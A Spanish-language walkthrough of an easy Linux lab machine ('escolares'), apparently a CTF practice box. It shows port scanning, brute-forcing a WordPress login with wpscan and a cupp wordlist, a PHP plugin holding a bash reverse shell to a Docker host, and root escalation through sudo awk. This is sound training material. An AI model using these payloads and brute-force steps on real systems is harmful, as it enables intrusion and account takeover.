---
Maquina: escolares
SO: Linux
Explotación: Análisis de web
Escala_privs: Permisos sudo / Procesos root
Dificultad: Fácil
tags:
  - maquina
  - web_discovery
  - linux
  - escala_privs
  - web
  - nibbleblog
  - procesos
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sS -Pn 172.17.0.2
```

![[Pasted image 20241030175501.png]]

2. **Ver la pagina web ubicada en el puerto 80**:

![[Pasted image 20241030175535.png]]

Es una página web muy chula sobre la universidad de ingenieros y habla sobre "conceptos" de ciberseguridad. Vamos a explorar a ver si encontramos algunos detalles curiosos en la web.

Indagando un poco por la web me ha parecido encontrar algo un poco sospechoso en el listado de profesores, parece que Luis nos ha dicho un usuario o contraseña y parece que es de un wordpress (admin wordpress)

![[Pasted image 20241030175830.png]]

Parece que si que tienen un wordpress con acceso al panel de login 

![[Pasted image 20241030181029.png]]

Muy importante añadir excolares.dl al /etc/hosts para que nos reconozca este sitio desde la ip de docker.

Ahora vamos a probar el usuario y pass que nos ha dado tan amablemente Luís y ver si cuela.

![[Pasted image 20241030181321.png]]

Parece que no cuela, pero ya sabemos que el usuario luisillo si que existe...

Pues tras probar varias herramientas la palma se la lleva WPscan y cupp.

WPscan una herramienta enfocada al análisis de wordpress y la cual nos permite realizar ataques de fuerza bruta como este

```bash
wpscan --url http://escolares.dl/wordpress --usernames luisillo --passwords /home/alejandro/wordlist/rockyou.txt
```

Cupp una herramienta que nos permite generar diccionarios a partir de datos personales de un usuario.

Si ejecutamos cupp -i y vamos añadiendo inforamción sobre Luis nos dará un diccionario enorme con posibles passwd.

Si despues le decimos a WPscan que intente iniciar sesión con ese diccionario obtenemos lo siguiente

![[Pasted image 20241031131747.png]]

Ya tenemos el usuario luisillo con passwd -> Luis1981 (y sabemos que es admin de wp)

![[Pasted image 20241031153834.png]]

Pues si que nos deja logearnos y para rematar vamos a conseguir una reverseshell a partir de la creación de un plugin. Es sencillo tan solo tenemos que poner un código malicioso en php, comprimirlo en zip y activar dicho plugin en wordpress

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'");
?>
```

En cuanto le damos a activar en el propio wordpress nos mandará una conexión a nuestra terminal.

![[Pasted image 20241031155437.png]]

![[Pasted image 20241031155453.png]]

Listo, ya estamos dentro. Ahora lo que tenemos que hacer es el tratamiento de terminal para pasar a una tty funcional.

![[Pasted image 20241031155728.png]]

Una vez con el tratamiento realizado toca pasar a la acción y ver que permisos tenemos o a donde podemos llegar a acceder...

![[Pasted image 20241031155828.png]]

Tras indagar un poco (realmente poco) nos topamos con una posible contraseña de luisillo -> iuisillopasswordsecret... Vamos a intentar logearnos a su usuario.

```bash
su luisillo
```

![[Pasted image 20241031161033.png]]

Y tras probar a ver los permisos que tenemos con sudo -l descubrimos que tenemos permisos para ejecutar awk como root.

![[Pasted image 20241031161128.png]]

Nos dirigimos a GTFObins y vemos a ver si nos topamos con ua autentica ventana para escalar privs...

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

![[Pasted image 20241031161339.png]]

